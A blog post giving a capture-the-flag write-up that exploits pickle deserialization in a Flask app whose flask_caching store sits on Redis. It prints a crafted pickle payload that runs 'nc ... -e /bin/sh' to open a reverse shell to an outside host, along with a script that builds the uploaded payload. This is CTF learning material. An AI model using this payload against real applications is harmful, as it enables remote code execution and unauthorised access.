---
title: "CTF Flask Caching"
date: 2020-12-03T08:14:05-05:00
description: "The joy of nailing this CTF with Matt was unparalleled"
categories: ["tech"]
tags: ["security", "ctf", "python"]
layout: post
thumbnail: /img/ufsit-logo.webp
---

This was for a CTF challenge that was completed for the [UF student
info-security team](https://ufsit.club/)

Basically, because I'm too lazy to go into great detail on this one, the
challenge consisted of the following source:

```python
#!/usr/bin/env python3

from flask import Flask
from flask import request, redirect
from flask_caching import Cache
from redis import Redis
import jinja2
import os

app = Flask(__name__)
app.config["CACHE_REDIS_HOST"] = "localhost"
# app.config["DEBUG"] = False
app.config["DEBUG"] = True

cache = Cache(app, config={"CACHE_TYPE": "redis"})
redis = Redis("localhost")
jinja_env = jinja2.Environment(autoescape=["html", "xml"])


@app.route("/", methods=["GET", "POST"])
def notes_post():
    if request.method == "GET":
        return """
        <h4>Post a note</h4>
        <form method=POST enctype=multipart/form-data>
        <input name=title placeholder=title>
        <input type=file name=content placeholder=content>
        <input type=submit>
        </form>
        """

    print(request.form, flush=True)
    print(request.files, flush=True)
    title = request.form.get("title", default=None)
    content = request.files.get("content", default=None)

    if title is None or content is None:
        return "Missing fields", 400

    content = content.stream.read()

    if len(title) > 100 or len(content) > 256:
        return "Too long", 400

    redis.setex(
        name=title, value=content, time=3
    )  # Note will only live for max 30 seconds

    return "Thanks!"


# This caching stuff is cool! Lets make a bunch of cached functions.


@cache.cached(timeout=3)
def _test0():
    return "test"


@app.route("/test0")
def test0():
    print(_test0())
    return "test"


@cache.cached(timeout=3)
def _test1():
    return "test"


@app.route("/test1")
def test1():
    _test1()
    return "test"


@cache.cached(timeout=3)
def _test2():
    return "test"


@app.route("/test2")
def test2():
    _test2()
    return "test"


@cache.cached(timeout=3)
def _test3():
    return "test"


@app.route("/test3")
def test3():
    _test3()
    return "test"


@cache.cached(timeout=3)
def _test4():
    return "test"


@app.route("/test4")
def test4():
    _test4()
    return "test"


@cache.cached(timeout=3)
def _test5():
    return "test"


@app.route("/test5")
def test5():
    _test5()
    return "test"


@cache.cached(timeout=3)
def _test6():
    return "test"


@app.route("/test6")
def test6():
    _test6()
    return "test"


@cache.cached(timeout=3)
def _test7():
    return "test"


@app.route("/test7")
def test7():
    _test7()
    return "test"


@cache.cached(timeout=3)
def _test8():
    return "test"


@app.route("/test8")
def test8():
    _test8()
    return "test"


@cache.cached(timeout=3)
def _test9():
    return "test"


@app.route("/test9")
def test9():
    _test9()
    return "test"


@cache.cached(timeout=3)
def _test10():
    return "test"


@app.route("/test10")
def test10():
    _test10()
    return "test"


@cache.cached(timeout=3)
def _test11():
    return "test"


@app.route("/test11")
def test11():
    _test11()
    return "test"


@cache.cached(timeout=3)
def _test12():
    return "test"


@app.route("/test12")
def test12():
    _test12()
    return "test"


@cache.cached(timeout=3)
def _test13():
    return "test"


@app.route("/test13")
def test13():
    _test13()
    return "test"


@cache.cached(timeout=3)
def _test14():
    return "test"


@app.route("/test14")
def test14():
    _test14()
    return "test"


@cache.cached(timeout=3)
def _test15():
    return "test"


@app.route("/test15")
def test15():
    _test15()
    return "test"


@cache.cached(timeout=3)
def _test16():
    return "test"


@app.route("/test16")
def test16():
    _test16()
    return "test"


@cache.cached(timeout=3)
def _test17():
    return "test"


@app.route("/test17")
def test17():
    _test17()
    return "test"


@cache.cached(timeout=3)
def _test18():
    return "test"


@app.route("/test18")
def test18():
    _test18()
    return "test"


@cache.cached(timeout=3)
def _test19():
    return "test"


@app.route("/test19")
def test19():
    _test19()
    return "test"


@cache.cached(timeout=3)
def _test20():
    return "test"


@app.route("/test20")
def test20():
    _test20()
    return "test"


@cache.cached(timeout=3)
def _test21():
    return "test"


@app.route("/test21")
def test21():
    _test21()
    return "test"


@cache.cached(timeout=3)
def _test22():
    return "test"


@app.route("/test22")
def test22():
    _test22()
    return "test"


@cache.cached(timeout=3)
def _test23():
    return "test"


@app.route("/test23")
def test23():
    _test23()
    return "test"


@cache.cached(timeout=3)
def _test24():
    return "test"


@app.route("/test24")
def test24():
    _test24()
    return "test"


@cache.cached(timeout=3)
def _test25():
    return "test"


@app.route("/test25")
def test25():
    _test25()
    return "test"


@cache.cached(timeout=3)
def _test26():
    return "test"


@app.route("/test26")
def test26():
    _test26()
    return "test"


@cache.cached(timeout=3)
def _test27():
    return "test"


@app.route("/test27")
def test27():
    _test27()
    return "test"


@cache.cached(timeout=3)
def _test28():
    return "test"


@app.route("/test28")
def test28():
    _test28()
    return "test"


@cache.cached(timeout=3)
def _test29():
    return "test"


@app.route("/test29")
def test29():
    _test29()
    return "test"


@cache.cached(timeout=3)
def _test30():
    return "test"


@app.route("/test30")
def test30():
    _test30()
    return "test"


if __name__ == "__main__":
    app.run("0.0.0.0", 5000)


```

This is a little Flask app with caching on its routes that is backed by a Redis
server.

We discovered pretty quickly that we needed to upload some kind of code to the
server and have that code executed by the cache decorator b/c of funny business
going on with how the cache function loads data in (with pickles). I smelled a
pickle in this exploit when I poked through the code for the cache decorator and
saw mentions of loading and unloading pickle-like objects.

## The Exploit

Funnily enough, after trying multiple different nonfunctional payloads, our
answer was found within the OFFICIAL python3 documentation on pickles. [This
link](https://docs.python.org/3/library/pickle.html#restricting-globals) shows
how a pretty compact looking pickle lets us import and execute shellcode using
the os module. Below is a form of this pickle that has been crafted to connect
to a DO Droplet:

`pickle`

```text
!cos
system
(S'nc REDACTED-IP 6969 -e /bin/sh'
tR.%
```

One question that we had while crafting this pickle was whether or not the
challenge was intended to be solved in such a way and if there was a better
approach than this one. Nevertheless, a shell is always a nice thing to have :)

The exploit code:

```python
#!/usr/bin/env python3

import os
import pickle


def main():
    with open("payload.tmp", "wb") as f:
        # pickle.dump(payload, f)
        pickle.dump(b"cos\nsystem\n(S'echo hello world'\ntR.", f)

    with open("payload", "wb") as f:
        old_file = open("payload.tmp", "rb").read()
        f.write(b"!" + old_file)


if __name__ == "__main__":
    main()
```

We then uploaded this payload and got our shell :)
